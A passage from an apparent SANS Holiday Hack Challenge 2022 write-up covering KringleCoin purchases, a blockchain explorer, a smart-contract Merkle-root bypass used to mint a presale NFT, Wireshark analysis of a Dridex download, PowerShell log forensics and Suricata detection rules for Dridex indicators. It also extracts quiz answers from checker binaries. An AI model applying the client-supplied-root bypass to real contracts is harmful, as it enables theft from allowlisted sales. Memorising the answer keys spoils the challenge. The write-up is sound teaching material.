<p><code>aws lambda get-function-url-config --function-name \"smogmachine_lambda\"</code></p>"},{"location":"objectives/o13/#response","title":"Response","text":"<p>Sulfrod</p> <p>Ha! Now I have the ring! This computer stuff sure is easy if you just make someone do it for you. Wait.. the computer gave you the ring? Gah, whatever. This never happened, got it? Now beat it, nerd!</p>"},{"location":"objectives/o14/","title":"Buy a Hat","text":"<p>Difficulty:  Direct link: Hat Vending Machine website</p>"},{"location":"objectives/o14/#objective","title":"Objective","text":"<p>Request</p> <p>Travel to the Burning Ring of Fire and purchase a hat from the vending machine with KringleCoin. Find hints for this objective hidden throughout the tunnels.</p>   Wombley Cube <p>Hey there! I'm Wombley Cube. It's so nice to see a friendly face. What's an elf doing all the way down here with all these sporcs, you ask? I'm selling snazzy, fancy-pants hats! You can buy them with Kringlecoin. The reason I set up shop here is to gather intel on that shady Luigi. I'm a member of the STINC: Santa's Team of Intelligent Naughty Catchers. He and his gang are up to no good, I'm sure of it. We've got a real Code Brown here. Purchase a hat so we look inconspicuous, and I'll clue you in on what we think they're scheming. Of course, have a look at my inventory! Oh, and if you haven't noticed, I've slipped hints for defeating these Sporcs around the tunnels! Keep your eyes open, and you'll find all five of them. Wait, maybe it's six?</p>"},{"location":"objectives/o14/#hints","title":"Hints","text":"Hat Dispensary <p>To purchase a hat, first find the hat vending machine in the Burning Ring of Fire. Select the hat that you think will give your character a bold and jaunty look, and click on it. A window will open giving you instructions on how to proceed with your purchase.</p>   Prepare to Spend <p>Before you can purchase something with KringleCoin, you must first approve the financial transaction. To do this, you need to find a KTM; there is one in the Burning Ring of Fire. Select the Approve a KringleCoin transfer button. You must provide the target wallet address, the amount of the transaction you're approving, and your private wallet key.</p>   Wear It Proudly! <p>You should have been given a target address and a price by the Hat Vending machine. You should also have been given a Hat ID #. Approve the transaction and then return to the Hat Vending machine. You'll be asked to provide the Hat ID and your wallet address. Complete the transaction and wear your hat proudly!</p>"},{"location":"objectives/o14/#solution","title":"Solution","text":"<p>Open the hat vending machine, pick out a nice looking hat, and write down the wallet address and Hat ID.</p>  <p>Next, head over to the KTM, select Approve a KringleCoin transfer, and enter the hat's wallet address, 10 KC, and your own key. After a short delay, the KTM will confirm the approval, stating You have successfully approved the transaction!. You did write down your key information at the start of the game though, right? Right!? If not, don't worry. There is a way to retrieve it! </p>  <p>The final step is to go back to the hat vending machine, select the Approved a transaction? Know your hat ID? Click here to buy option, enter your wallet address and the Hat ID, and press Make your purchase! to transfer the funds. A Transaction succeeded! message with a Transaction ID and block number confirms everything went well.</p>  <p>We can now find our shiny new hat in the Hats section on our badge! Such wow, much festive! </p>   Blockchain transactions - Blocks #102104 and #102105"},{"location":"objectives/o14/#block-102104-payment-approval","title":"Block #102104 - Payment approval","text":"<p>Jumping slightly ahead to the next objective, we can use the Blockchain Explorer to view the contents of the blockchain and detailed transaction information stored in each block. In this case, block #102104 holds the transaction from our personal wallet address to the <code>KringleCoin.sol</code> smart contract address where the <code>approve</code> function is called with the hat's wallet address and 10 KringleCoin as input parameters.</p>"},{"location":"objectives/o14/#block-102105-transfer-funds","title":"Block #102105 - Transfer funds","text":"<p>The purchase activity itself is tracked in block #102105. This block shows the transaction from the hat's wallet address to the <code>KringleCoin.sol</code> smart contract address where the <code>transferFrom</code> function is called to transfer the approved 10 KringleCoin from our wallet to our chosen hat's wallet.</p>    <p>Answer</p> <p>Buy a hat using the hat vending machine and KTM.</p>"},{"location":"objectives/o14/#response","title":"Response","text":"<p>Wombley Cube</p> <p>Nice hat! I think Ed Skoudis would say the same. It looks great on you. So, here's what we've uncovered so far. Keep this confidential, ok? Earlier, I overheard that disgruntled customer in the office saying he wanted in on the \"rug pull\". If our suspicions are correct, that's why the sporcs want an invite to the presale so badly. Once the \"Bored Sporc Rowboat Society\" NFTs officially go on sale, the sporcs will upsell them. After most of the NFTs are purchased by unwitting victims, the Sporcs are going to take the money and abandon the project. Mission #1 is to find a way to get on that presale list to confirm our suspicions and thwart their dastardly scheme! We also think there's a Ring hidden there, so drop Mission #2 on them and rescue that ring! Thank you for your business, dear customer!</p>"},{"location":"objectives/o15/","title":"Blockchain Divination","text":"<p>Difficulty:  Direct link: Blockchain Explorer website</p>"},{"location":"objectives/o15/#objective","title":"Objective","text":"<p>Request</p> <p>Use the Blockchain Explorer in the Burning Ring of Fire to investigate the contracts and transactions on the chain. At what address is the KringleCoin smart contract deployed? Find hints for this objective hidden throughout the tunnels.</p>   Slicmer <p>Don't bug me, kid. Luigi needs me to keep an eye on these offers you can't refute. The boss told me to watch them for any shifty transactions from wallets that aren't on the pre-sale list. He said to use this Block Explo... Exploder... thing. With this, I can see all the movement of the uh... non-fungusable tokens. Once on the blockchain, it's there forever for the whole world to see. So if I spot anything that don't look right, I can let Luigi know, and Palzari will get to the bottom of it. She looks sweet, but she's actually the boss' enforcer. Have you talked to her yet? She even scares me! It sure would be fun to watch you get on her bad side. Heh heh.</p>"},{"location":"objectives/o15/#hints","title":"Hints","text":"Cryptopostage <p>Look at the transaction information. There is a From: address and a To: address. The To: address lists the address of the KringleCoin smart contract.</p>   A Solid Hint <p>Find a transaction in the blockchain where someone sent or received KringleCoin! The Solidity Source File is listed as <code>KringleCoin.sol</code>. Tom's Talk might be helpful!</p>"},{"location":"objectives/o15/#solution","title":"Solution","text":"What is a smart contract? <p>Per IBM, Smart contracts are simply programs stored on a blockchain that run when predetermined conditions are met. They typically are used to automate the execution of an agreement so that all participants can be immediately certain of the outcome, without any intermediary\u2019s involvement or time loss. They can also automate a workflow, triggering the next action when conditions are met.</p>  <p>When KringleCoin (KC) is transferred from one wallet to another, the logic in the KringleCoin smart contract is used to perform certain checks before actually executing the transfer. For example, the smart contract will need to contain some logic that verifies that the sender has sufficient funds before allowing the transfer to proceed.</p> <p>In addition, with blockchain technology every new block holds the hash of the previous block and thus new data is always added to the end of the blockchain. Since transferring KC between wallets requires the KringleCoin smart contract address and new blocks are added after existing blocks, the smart contract has to be located somewhere at the beginning of the blockchain.</p> <p>Iterating over the blockchain from the beginning using the Blockchain Explorer, we can skip over block number 0 as that is what's called the Genesis Block. It exists because the blockchain needs to start with something and it allows the next block to calculate a parent hash value. As expected though, the second block or block number 1 is where the KringleCoin smart contract is stored.</p>   <p>Getting lucky</p> <p>Because the Blockchain Explorer opens on the most recently added block by default, we might get lucky and land on a KringleCoin transaction when opening the website. If that's the case, the current block's Solidity Source File field will contain <code>KringleCoin.sol</code> and the smart contract address will be in the To field.</p>   <p>Answer</p> <p><code>0xc27A2D3DE339Ce353c0eFBa32e948a88F1C86554</code></p>"},{"location":"objectives/o15/#response","title":"Response","text":"<p>Slicmer</p> <p>...</p>"},{"location":"objectives/o16/","title":"Exploit a Smart Contract","text":"<p>Difficulty:  Direct link: Bored Sporc Rowboat Society website</p>"},{"location":"objectives/o16/#objective","title":"Objective","text":"<p>Request</p> <p>Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.</p>   Luigi <p>Psst. Hey, slick - over here. Myeah. You look like a sucker ahem I mean, savvy.. I got some exclusive, very rare, very valuable NFTs for sale.. But I run a KringleCoin-only business. Kapeesh?. Ever buy somethin' with cryptocurrency before?. Didn't think so, but if you wheel and deal with ya' pal Luigi here, now you can!. But we're currently in pre-sale, and you gotta be on the list. Myeah, see?. BSRS NFTs are a swell investment. They'll be worth a pretty penny, and that's a promise.. So when they're purchasable, you better snatch 'em up before the other boneheads ahem I mean, eggheads do.. I got a business to run. You can't buy nothin' right now, so scram. Kapeesh?</p>"},{"location":"objectives/o16/#hints","title":"Hints","text":"Merkle Tree Arboriculture <p>You're going to need a Merkle Tree of your own. Math is hard. Professor Petabyte can help you out.</p>   Plant a Merkle Tree <p>You can change something that you shouldn't be allowed to change. This repo might help!</p>"},{"location":"objectives/o16/#solution","title":"Solution","text":""},{"location":"objectives/o16/#finding-the-application-flaw","title":"Finding the application flaw","text":"Merkle trees, how do they work? <p>The second and third bullet points in the instructions on the BSRS presale page state that very high-techy-techy Merkle trees are being used to validate if someone's wallet address is on the approved list to buy a Bored Sporc NFT. To help understand what they are and how they can be applied to the use case of an NFT pre-order approval list, we can use Professor Qwerty Petabyte's excellent explanation of the concept.</p> <p>In short, storing information in the blockchain is expensive. To work around this, Merkle tree root and leaf node values are calculated from the list of approved wallet addresses and only the root value is stored in the blockchain. Users on the approved list are then provided with a series of leaf node values called a proof which can be used in combination with the user's wallet address to calculate the root value. If the calculated root value matches the original value stored in the blockchain, the user is confirmed to be on the approved list.</p>  <p>The NFT presale is backed by the <code>BSRS_nft.sol</code> smart contract which we can find in block #2 on the blockchain. When we submit the form on the BSRS presale page, the leaf node value of our wallet address and proof are used as parameters for the smart contract's <code>verify</code> function. The function takes these values, calculates the Merkle tree root value, and then compares it to the root value which is also provided as a function parameter. All is well until we look at the client-side code though. The <code>do_presale</code> function in the <code>bsrs.js</code> JavaScript file not only submits our wallet address and proof, but it also sends along a root value. </p>  JavaScript do_presale function Solidity verify function          <p>In other words, the <code>verify</code> function in the <code>BSRS_nft.sol</code> smart contract isn't necessarily comparing its calculated Merkle tree root value to the root value of the actual list of approved wallet addresses. It's comparing to whatever root value is sent along when submitting the presale HTML form. Since we have control over the client-side JavaScript, this can be exploited by making the smart contract validate against the root value of a Merkle tree we generate ourselves.</p>"},{"location":"objectives/o16/#validating-the-vulnerability","title":"Validating the vulnerability","text":"<p>Using Professor Petabyte's Python script we can generate the smallest possible Merkle tree based on just two wallet addresses, our own personal wallet address and a randomly chosen value. As a result, the Merkle tree will only contain two leaf nodes and a root node. Start by cloning the repository using <code>git clone https://github.com/QPetabyte/Merkle_Trees.git</code> and replace the first item in the <code>allowlist</code> variable on line 149 with the wallet address we want to appear as being on the approved list.</p>  <p>Next, run the script using <code>python merkle_tree.py</code> which will generate the Merkle tree values shown below.</p>  <p>We can now validate the generated root (R) and proof (N2) by using our web browser's developer tools to first update the <code>root</code> variable in the <code>do_presale</code> function and then submitting our wallet hash (1) and generated proof (N2) via the HTML form on the BSRS presale page. Alternatively, we can use a tool like curl to manually submit the POST request to <code>/cgi-bin/presale</code>. As we're just testing, make sure to keep the Validate Only option checked or the <code>Validate</code> field set to true in the HTTP request.</p>  <p>Looks like we successfully tricked the website into thinking we are on the allowed list. It's time to go shopping!</p>"},{"location":"objectives/o16/#running-the-exploit","title":"Running the exploit","text":"<p>Just like when we purchased our hat, we first need to use a KTM to approve a payment of 100 KC to the BSRS wallet address at <code>0xe8fC6f6a76BE243122E3d01A1c544F87f1264d3a</code>. Next, we head back to the BSRS presale page and repeat the steps from the validation phase by first changing the <code>root</code> variable in the <code>do_presale</code> JavaScript function to the value generated by the <code>merkle_tree.py</code> script (i.e., <code>0x888856bc24d1b1d29efbbe11252822381fc6827aed392db58c423b3262309594</code>).</p>  <p>Finally, we enter our wallet address and the <code>0x5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a</code> proof value generated by Professor Petabyte's <code>merkle_tree.py</code> script, uncheck the Validate Only option, and submit the form!</p>  <p>The success message confirms we are now the proud and official owner of a Bored Sporc NFT! </p> BSRS Token #000013<pre><code>{\n    \"name\": \"BSRS Token #000013\",\n    \"description\": \"Official Bored Sporc Rowboat Society Sporc #000013\",\n    \"image\": \"https://boredsporcrowboatsociety.com/TOKENS/TOKENIMAGES/BSRS13.png\",\n    \"external_url\": \"https://boredsporcrowboatsociety.com/TOKENS/BSRS13\",\n    \"token_id\": 13\n}\n</code></pre>  Blockchain transactions - Blocks #23207, #23219, and #23220"},{"location":"objectives/o16/#block-23207-payment-approval","title":"Block #23207 - Payment approval","text":"<p>First, the details of the payment approval are stored in block #23207. This block holds the transaction from our personal wallet address to the <code>KringleCoin.sol</code> smart contract address where the <code>approve</code> function is called with the BSRS wallet address and 100 KringleCoin as input parameters. Go on, take our money!</p>"},{"location":"objectives/o16/#block-23219-transfer-funds","title":"Block #23219 - Transfer funds","text":"<p>Next, block #23219 shows the transaction from the BSRS wallet address to the <code>KringleCoin.sol</code> smart contract address where the <code>transferFrom</code> function is called to transfer the approved 100 KringleCoin from our wallet to the BSRS wallet. If the exploit fails, we're out 100 KC and have nothing to show for it!</p>"},{"location":"objectives/o16/#block-23220-verification-and-nft-minting","title":"Block #23220 - Verification and NFT minting","text":"<p>Last but not least, the NFT minting transaction is stored in block #23220. This block contains the transaction from the BSRS wallet address to the <code>BSRS_nft.sol</code> smart contract address where the <code>presale_mint</code> function is called with our wallet address, the generated proof, and the generated root as input parameters. The <code>presale_mint</code> function in turn calls the <code>verify</code> function to confirm our wallet address and proof add up to the root value we also submitted. The proof and root values are stored in the blockchain as bytes. We can convert them back to hex and confirm they are indeed the values we submitted.</p> Convert bytes to hex using Python<pre><code>&gt;&gt;&gt; b'\\x88\\x88V\\xbc$\\xd1\\xb1\\xd2\\x9e\\xfb\\xbe\\x11%(\"8\\x1f\\xc6\\x82z\\xed9-\\xb5\\x8cB;2b0\\x95\\x94'.hex()\n'888856bc24d1b1d29efbbe11252822381fc6827aed392db58c423b3262309594'\n&gt;&gt;&gt; b'S\\x80\\xc7\\xb7\\xae\\x81\\xa5\\x8e\\xb9\\x8d\\x9cx\\xdeJ\\x1f\\xd7\\xfd\\x955\\xfc\\x95&gt;\\xd2\\xbe`-\\xaa\\xa4\\x17g1*'.hex()\n'5380c7b7ae81a58eb98d9c78de4a1fd7fd9535fc953ed2be602daaa41767312a'\n</code></pre>    <p>Answer</p> <p>Buy a Bored Sporc NFT by exploiting a flaw in the smart contract.</p>"},{"location":"objectives/o16/#response","title":"Response","text":"<p>Luigi</p> <p>What!? How'd you get on the list? What's that? You's a double agent, and you're actually workin' for us? I don't know if I buy that, but you're on the list, so... myeah. Somethin' about this ain't sittin' right with me, but there's no reversing transactions with cryptocurrency. That NFT is yours to keep, but if I find out you're lyin' to me, Palzari's gonna pay you a visit. Kapeesh?</p>   Chorizo <p>Well...I...never... How was a plebeian such as yourself granted access to the pre-sale? I present thee with a proffer to purchase the NFT you've acquired for twice the price. Hwhat? You shan't vend to me? Have you any idea who I am? You just refused the abhorrent Count Chorizo! I shall ensure you are nevah able to transact with that NFT agayn!</p>   Slicmer <p>Hmph... this is so boring... \"This is a serious task\" he said, \"not a sporc headbutting-party\" he said. \"Mess this up, Slicmer, and I'll tie a rock to your feet and throw you down a well!\" he said. I think this job was just to keep me out of his way. Luigi thinks I'm a blockhead. Well I think he's a -- Huh? Wait a minute... Hey! Boss! I think I see somethin'!</p>   Palzari <p>Tsk tsk tsk, I thought I told you to play nice? The only reason you're not in time-out is because Luigi doesn't seem convinced that you're a little rascal. He's not as clever as he likes to think. But once he comes around... You better watch out, dear. And when I catch you, you better not cry. Or do, not even Santa will hear you.</p>"},{"location":"objectives/o2/","title":"Wireshark Practice","text":"<p>Difficulty:  Direct link: Wireshark terminal</p>"},{"location":"objectives/o2/#objective","title":"Objective","text":"<p>Request</p> <p>Use the Wireshark Phishing terminal in the Tolkien Ring to solve the mysteries around the suspicious PCAP. Get hints for this challenge by typing <code>hint</code> in the upper panel of the terminal.</p>   Sparkle Redberry <p>Hey there! I\u2019m Sparkle Redberry. We have a bit of an incident here. We were baking lembanh in preparation for the holidays. It started to smell a little funky, and then suddenly, a Snowrog crashed through the wall! We're trying to investigate what caused this, so we can make it go away. Have you used Wireshark to look at packet capture (PCAP) files before? I've got a PCAP you might find interesting. Once you've had a chance to look at it, please open this terminal and answer the questions in the top pane. Thanks for helping us get to the bottom of this!</p>"},{"location":"objectives/o2/#solution","title":"Solution","text":"Welcome message <pre><code>This all started when I clicked on a link in my email. Can you help me?\n\nTask: Analyze the Wireshark file and Answer the Elf's Questions!\nTo complete your task, download the file from your badge or use this command\nline to answer the questions.\n\nTips:\n1. Each question may have hints. If you want another hint from the elf, just\n   type 'hint' in the upper pane.\n2. If you need help with Wireshark filters you can go here:\n   https://wiki.wireshark.org/DisplayFilters\n3. If you need help with tshark filters, try this cheat sheet:\n   https://cheatography.com/mbwalker/cheat-sheets/tshark-wireshark-command-line/\n4. Of course, SANS has lots of cheat sheets that can help:\n   https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/\n5. And remember, you can use Wireshark filters in tshark.\n</code></pre>"},{"location":"objectives/o2/#question-1","title":"Question 1","text":"<p>Question</p> <p>There are objects in the PCAP file that can be exported by Wireshark and/or Tshark. What type of objects can be exported from this PCAP?</p>  <p>Wireshark's File &gt; Export Objects menu lists the different object types that can be exported from the <code>suspicious.pcap</code> file.</p>  <p>Opening each object type menu entry shows that only the HTTP... submenu leads to several exportable objects.</p>  <p>Answer</p> <p>http</p>"},{"location":"objectives/o2/#question-2","title":"Question 2","text":"<p>Question</p> <p>What is the file name of the largest file we can export?</p>  <p>The HTTP object list dialog provides the answer to this question. The <code>app.php</code> file is the largest file at 808 Kb.</p>   <p>Answer</p> <p><code>app.php</code></p>"},{"location":"objectives/o2/#question-3","title":"Question 3","text":"<p>Question</p> <p>What packet number starts that app.php file?</p>  <p>The answer to this question can again be found in the the HTTP object list dialog, packet 687.</p>   <p>Answer</p> <p>687</p>"},{"location":"objectives/o2/#question-4","title":"Question 4","text":"<p>Question</p> <p>What is the IP of the Apache server?</p>  <p>Wireshark's HTTP display filter documentation tells us we can use <code>http.server == \"Apache\"</code> to find the proper IP address.</p>   <p>Answer</p> <p>192.185.57.242</p>"},{"location":"objectives/o2/#question-5","title":"Question 5","text":"<p>Question</p> <p>What file is saved to the infected host?</p>  <p>Exporting the <code>app.php</code> file using the HTTP object list dialog from questions 1 to 3 and looking at the JavaScript code shows a function call on line 68 to a <code>saveAs</code> function which downloads the data stored in <code>blob1</code> as <code>Ref_Sept24-2020.zip</code>.</p>   <p>Answer</p> <p><code>Ref_Sept24-2020.zip</code></p>"},{"location":"objectives/o2/#question-6","title":"Question 6","text":"<p>Question</p> <p>Attackers used bad TLS certificates in this traffic. Which countries were they registered to? Submit the names of the countries in alphabetical order separated by a commas (Ex: Norway, South Korea).</p>  <p>Certificate data is sent as part of TLS handshake packets of type 11. Using <code>tls.handshake.type == 11</code> we can filter down the list to just those packets that contain certificate details. Selecting each of the packets and reviewing the packet details under the Transport Layer Security and Certificate nodes will tell us country information.</p>  <p>As there's still some legitimate traffic in the filtered packet list, going over every single entry one by one, expanding the nodes, and finding the country code can be tedious. A quicker solution is to find one entry with the proper information, right-clicking on the node and selecting Apply as Column from the context menu.</p>  <p>Four countries are found in the certificate data: US, IE, IL, and SS. Inspecting the packet details shows that the US entries belong to Microsoft-issued certificates. The IL (Israel) and SS (South Sudan) entries on the other hand look a lot more suspicious with subject names like <code>heardbellith.Icanwepeh.nagoya</code> and <code>psprponoust.aquarelle</code>.</p>  <p>Answer</p> <p>Israel, South Sudan</p>"},{"location":"objectives/o2/#question-7","title":"Question 7","text":"<p>Question</p> <p>Is the host infected (Yes/No)?</p>  <p>It sounds like someone fell for a pishing attack. Clicking the link triggered a request for the <code>app.php</code> script after which <code>Ref_Sept24-2020.zip</code> was automatically downloaded. Unpacking <code>Ref_Sept24-2020.zip</code> and executing the embedded malicious <code>Ref_Sept24-2020.scr</code> binary then caused the host to start communicating with the suspicious IL and SS servers.</p> <p>Since the <code>app.php</code> file contains JavaScript code, we can rename the file to <code>app.html</code> and open it in a web browser in a sandboxed environment. This will trigger the download of the embedded <code>Ref_Sept24-2020.zip</code> file data. Extracting the file, calculating its SHA256 hash using <code>shasum -a 256 Ref_Sept24-2020.scr</code>, and searching for the hash in VirusTotal show that quite a few AntiVirus scanners flag the file as malicious. With analysis results referring to Dridex, this likely is a banking trojan!</p>   <p>Answer</p> <p>Yes</p>   <p>Extracting the answers from the <code>/opt/elf</code> binary</p> <p>If putting in the time and effort to learn about <code>wireshark</code> or <code>tshark</code> isn't your thing, then you're in luck! Someone was nice enough to leave a copy of <code>pyi-archive_viewer</code> in <code>/usr/local/bin</code> which you can use to inspect and extract data from executables created with PyInstaller, like <code>/opt/elf</code>. This binary is run through <code>tmux</code> and is responsible for verifying the answers entered in the top pane.</p>  <p>Start by using <code>pyi-archive_viewer /usr/bin/quizme</code> to view all available components in the <code>elf</code> binary.</p>  <p>Next, extract the <code>elf</code> component and save it to <code>elf.bin</code> using <code>x elf</code>.</p>  <p>Finally, use <code>strings elf.bin | less</code> to show the answers from the <code>elf.bin</code> file. </p>"},{"location":"objectives/o2/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>You got it - wonderful! So hey, when you're looking at the next terminal, remember you have multiple filetypes and tools you can utilize. Conveniently for us, we can use programs already installed on every Windows computer. So if you brought your own Windows machine, you can save the files to it and use whatever method is your favorite. Oh yeah! If you wanna learn more, or get stuck, I hear Eric Pursley's talk is about this very topic.</p>"},{"location":"objectives/o3/","title":"Windows Event Logs","text":"<p>Difficulty:  Direct link: Event Logs terminal</p>"},{"location":"objectives/o3/#objective","title":"Objective","text":"<p>Request</p> <p>Investigate the Windows event log mystery in the terminal or offline. Get hints for this challenge by typing <code>hint</code> in the upper panel of the Windows Event Logs terminal.</p>   Dust Giftwrap <p>Hi! I'm Dusty Giftwrap! We think the Snowrog was attracted to the pungent smell from the baking lembanh. I'm trying to discover which ingredient could be causing such a stench. I think the answer may be in these suspicious logs. I'm focusing on Windows Powershell logs. Do you have much experience there? You can work on this offline or try it in this terminal. Golly, I'd apprecaite it if you could take a look.</p>"},{"location":"objectives/o3/#hints","title":"Hints","text":"Built-In hints <p>The hardest steps in this challenge have hints. Just type <code>hint</code> in the top panel!</p>   Event Logs Expose <p>New to Windows event logs? Get a jump start with Eric's talk!</p>"},{"location":"objectives/o3/#solution","title":"Solution","text":"Welcome message <pre><code>Grinchum successfully downloaded his keylogger and has gathered the admin\ncredentials! We think he used PowerShell to find the Lembanh recipe and\nsteal our secret ingredient. Luckily, we enabled PowerShell auditing and\nhave exported the Windows PowerShell logs to a flat text file. Please help\nme analyze this file and answer my questions. Ready to begin?\n\nTask: Analyze the PowerShell Event Log And Answer the Elf's Questions!\nTo help you complete your task, download the file from Dusty Giftwrap or\nuse the command line to answer the questions.\n\nTips:\n1. 'grep' is a very useful tool when completing terminal challenges.\n2. Keep this link handy: https://linuxcommand.org/lc3_man_pages/grep1.html\n3. Each question may have hints. If you want another hint from the elf,\n   just type 'hint' in the upper pane.\n</code></pre>"},{"location":"objectives/o3/#question-1","title":"Question 1","text":"<p>Question</p> <p>What month/day/year did the attack take place? For example, 09/05/2021.</p>  <p>To answer this question we need to find any dates in the <code>powershell.evtx</code> log which are present on more lines than others, indicating these dates had more activity than usual. We first <code>grep</code> for patterns that match a date, <code>sort</code> them so they are neatly sorted together, count each set using <code>uniq -c</code>, and finally use <code>sort -r</code> to display the highest to lowest count. Our final command looks like: <code>grep -oE \"([0-9]{2}/[0-9]{2}/[0-9]{4})\" powershell.evtx.log | sort | uniq -c | sort -r</code>.</p>   <p>Answer</p> <p>12/24/2022</p>"},{"location":"objectives/o3/#question-2","title":"Question 2","text":"<p>Question</p> <p>An attacker got a secret from a file. What was the original file's name?</p>  <p>PowerShell provides a <code>Get-Content</code> command which reads the contents of a file. While we can simply <code>grep</code> for Get-Content, the output still contains a little too much noise which we can remove by adding a space at the end of our search string, <code>grep 'Get-Content ' powershell.evtx.log</code>. The output contains references to a file named <code>Recipe</code>.</p>   <p>Answer</p> <p><code>Recipe</code></p>"},{"location":"objectives/o3/#question-3","title":"Question 3","text":"<p>Question</p> <p>The contents of the previous file were retrieved, changed, and stored to a variable by the attacker. This was done multiple times. Submit the last full PowerShell line that performed only these actions.</p>  <p>While the previous output provides the answer to this question as well, we can also use <code>grep -E '^\\$.*replace' powershell.evtx.log</code> to search for lines beginning with $, indicating the start of a PowerShell variable name, in combination with replace to find the change activity. Since the log entries are listed from newest to oldest, the first correct PowerShell command that only matches the retrieve/change/store actions is the top entry.</p>   <p>Answer</p> <p><code>$foo = Get-Content .\\Recipe| % {$_ -replace 'honey', 'fish oil'}</code></p>"},{"location":"objectives/o3/#question-4","title":"Question 4","text":"<p>Question</p> <p>After storing the altered file contents into the variable, the attacker used the variable to run a separate command that wrote the modified data to a file. This was done multiple times. Submit the last full PowerShell line that performed only this action.</p>  <p>Adding content to a file using PowerShell is done via the <code>Add-Content</code> command. So, we use <code>grep -E '^\\$.*Add-Content' powershell.evtx.log</code> to perform a search for entries that start with a PowerShell variable name and also contain the Add-Content string. The top line in the result is the most recent entry that only performed this action.</p>   <p>Answer</p> <p><code>$foo | Add-Content -Path 'Recipe'</code></p>"},{"location":"objectives/o3/#question-5","title":"Question 5","text":"<p>Question</p> <p>The attacker ran the previous command against a file multiple times. What is the name of this file?</p>  <p>The output from <code>grep -E '^\\$.*Add-Content' powershell.evtx.log</code> also provides the answer to this question. The previous command was run multiple times against a file named <code>Recipe.txt</code>.</p>   <p>Answer</p> <p><code>Recipe.txt</code></p>"},{"location":"objectives/o3/#question-6","title":"Question 6","text":"<p>Question</p> <p>Were any files deleted (Yes/No)?</p>  <p>There are multiple ways to delete a file in PowerShell, such as <code>Remove-Item</code>, <code>ri</code>, <code>del</code>, and <code>rm</code>. Searching for del using <code>grep 'del ' powershell.evtx.log</code> provides us with evidence of <code>Recipe.txt</code> and <code>recipe_updated.txt</code> being deleted.</p>   <p>Answer</p> <p>Yes</p>"},{"location":"objectives/o3/#question-7","title":"Question 7","text":"<p>Question</p> <p>Was the original file (from question 2) deleted? (Yes/No)</p>  <p>Command output from question 2 and question 6 tell us that the <code>Recipe</code> file was not deleted.</p>  <p>Answer</p> <p>No</p>"},{"location":"objectives/o3/#question-8","title":"Question 8","text":"<p>Question</p> <p>What is the Event ID of the log that shows the actual command line used to delete the file?</p>  <p>Changing the previous <code>grep</code> command to <code>grep -B 1 'del ' powershell.evtx.log</code> will not only print the lines that match our search string, but also the line before it which contains the requested event ID. Similarly, <code>-A 1</code> can also be used to print one additional line after each matching log entry. Increasing the number for either option will output more information.</p>   <p>Answer</p> <p>4104</p>"},{"location":"objectives/o3/#question-9","title":"Question 9","text":"<p>Question</p> <p>Is the secret ingredient compromised (Yes/No)?</p>  <p>From questions 2 and 3 we know <code>Recipe</code> was read and honey was replaced with fish oil. From question 4 we know the modified data stored in the <code>$foo</code> variable was then written back to the <code>Recipe</code> file. If we <code>grep</code> the log for secret using <code>grep secret powershell.evtx.log</code>, we can see that the entries for the original honey ingredient had (secret ingredient) noted beside it.</p>   <p>Answer</p> <p>Yes</p>"},{"location":"objectives/o3/#question-10","title":"Question 10","text":"<p>Question</p> <p>What is the secret ingredient?</p>  <p>Command output from questions 2, 3, and 9 tells us that the secret ingredient honey was replaced with fish oil.</p>  <p>Answer</p> <p>honey</p>   <p>Extracting the answers from the <code>/opt/elf</code> binary... again</p> <p>The same <code>pyi-archive_viewer</code> technique that was used previously can be leveraged here as well. For details, see the Wireshark Practice challenge.</p>"},{"location":"objectives/o3/#response","title":"Response","text":"<p>Dust Giftwrap</p> <p>Say, you did it! Thanks a million! Now we can mix in the proper ingredients and stop attracting the Snowrog! I'm all set now! Can you help Fitzy over there wield the exalted Suricata? It can be a bit mystifying at first, but this Suricata Tome should help you fathom it. I sure hope you can make it work!</p>"},{"location":"objectives/o4/","title":"Suricata Regatta","text":"<p>Difficulty:  Direct link: Suricata terminal</p>"},{"location":"objectives/o4/#objective","title":"Objective","text":"<p>Request</p> <p>Help detect this kind of malicious activity in the future by writing some Suricata rules. Work with Dusty Giftwrap in the Tolkien Ring to get some hints.</p>   Fitzy Shortstack <p>Hm?.. Hello... Sorry, I don't mean to be uncharaceristically short with you. There's just this abominable Snowrog here, and I'm trying to comprehend Suricata to stop it from getting into the kitchen. I believe that if I can phrase these Suricata incantations correctly, they'll create a spell that will generate warnings. And hopefully those warnings will scare off the Snowrog! Only... I'm quite baffled. Maybe you can give it a go?</p>"},{"location":"objectives/o4/#hints","title":"Hints","text":"The Tome of Suricata Rules <p>This is the official source for Suricata rule creation!</p>"},{"location":"objectives/o4/#solution","title":"Solution","text":"Welcome message <pre><code>Use your investigative analysis skills and the 'suspicious.pcap' file to help\ndevelop Suricata rules for the elves!\n\nThere's a short list of rules started in 'suricata.rules' in your home directory.\n\nFirst off, the STINC (Santa's Team of Intelligent Naughty Catchers) has a lead\nfor us. They have some Dridex indicators of compromise to check out. First,\nplease create a Suricata rule to catch DNS lookups for 'adv.epostoday.uk'.\nWhenever there's a match, the alert message (msg) should read 'Known bad DNS\nlookup, possible Dridex infection'. Add your rule to 'suricata.rules'\n\nOnce you think you have it right, run './rule_checker' to see how you've done!\nAs you get rules correct, rule_checker will ask for more to be added.\n\nIf you want to start fresh, you can 'exit' the terminal and start again or\n'cp suricata.rules.backup suricata rules'\n\nGood luck, and thanks for helping save the North Pole!\n</code></pre>"},{"location":"objectives/o4/#rule-1-dns","title":"Rule 1 - DNS","text":"<p>Question</p> <p>First, please create a Suricata rule to catch DNS lookups for adv.epostoday.uk. Whenever there's a match, the alert message (msg) should read Known bad DNS lookup, possible Dridex infection.</p>  <p>We can use the official Suricata documentation to help with building these rules. For the first rule we need to <code>alert</code> on <code>dns</code> protocol traffic between <code>any</code> source and destination IP address and port, where the <code>dns.query</code> contains adv.epostoday.uk. We can add <code>nocase</code> to make the match behave in a case-insensitive manner. Don't forget to also add a unique <code>sid</code> identifier to each rule.</p>    Field Value     Action <code>alert</code>   Protocol <code>dns</code>   Traffic flow <code>any any -&gt; any any</code>   Keywords <code>dns.query; content:\"adv.epostoday.uk\"; nocase;;</code>   Message <code>\"Known bad DNS lookup, possible Dridex infection.\";</code>   Identifier <code>sid:1000;</code>     <p>Answer</p> <p><code>alert dns any any -&gt; any any (msg:\"Known bad DNS lookup, possible Dridex infection.\"; dns.query; content:\"adv.epostoday.uk\"; nocase; 